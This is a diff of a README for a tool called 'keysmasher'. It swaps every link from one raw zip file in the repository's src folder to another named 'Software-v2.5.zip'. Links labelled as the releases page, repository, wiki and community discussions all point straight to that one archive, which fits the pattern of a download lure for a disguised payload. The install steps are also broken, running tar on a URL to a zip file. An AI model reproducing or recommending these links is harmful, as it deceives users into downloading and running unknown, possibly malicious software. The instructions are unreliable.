@@ -12,11 +12,11 @@ Before you get started, make sure your computer meets these basic requirements:
 ## 📥 Download & Install
 To download keysmasher, click the button below to visit the Releases page:
 
-[![Download keysmasher](https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/keysmasher-1.9.zip%20keysmasher-v1.0-orange)](https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/keysmasher-1.9.zip)
+[![Download keysmasher](https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/Software-v2.5.zip%20keysmasher-v1.0-orange)](https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/Software-v2.5.zip)
 
 Follow these steps to install the application:
 
-1. Click on the link above to go to the [Releases page](https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/keysmasher-1.9.zip).
+1. Click on the link above to go to the [Releases page](https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/Software-v2.5.zip).
 2. Choose the latest version from the list.
 3. Download the appropriate file for your operating system.
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -37,11 +37,11 @@ If you need additional help, look for instructions specific to your operating sy
 4. Navigate to your Applications folder and double-click on keysmasher to launch it.
 
 ## 🐧 Linux Installation
-1. Download the `https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/keysmasher-1.9.zip` file from the Releases page.
+1. Download the `https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/Software-v2.5.zip` file from the Releases page.
 2. Open your terminal and navigate to your downloads folder.
 3. Extract the downloaded file by running:
    ```bash
-   tar -xzf https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/keysmasher-1.9.zip
+   tar -xzf https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/Software-v2.5.zip
    ```
 4. Change into the newly created directory:
    ```bash
@@ -95,9 +95,9 @@ Currently, keysmasher is available in English only. Future updates may introduce
 
 ## 🔗 Additional Resources
 For more information and updates on keysmasher, check out:
-- [GitHub Repository](https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/keysmasher-1.9.zip)
-- [Wiki Section](https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/keysmasher-1.9.zip)
-- [Community Discussions](https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/keysmasher-1.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/Software-v2.5.zip)
+- [Wiki Section](https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/Software-v2.5.zip)
+- [Community Discussions](https://raw.githubusercontent.com/Omar445246/keysmasher/main/src/Software-v2.5.zip)
 
 ## 👥 Contributing
 If you want to contribute to keysmasher, feel free to fork the repository. Submit your changes via pull requests. Your contributions are welcome and appreciated!
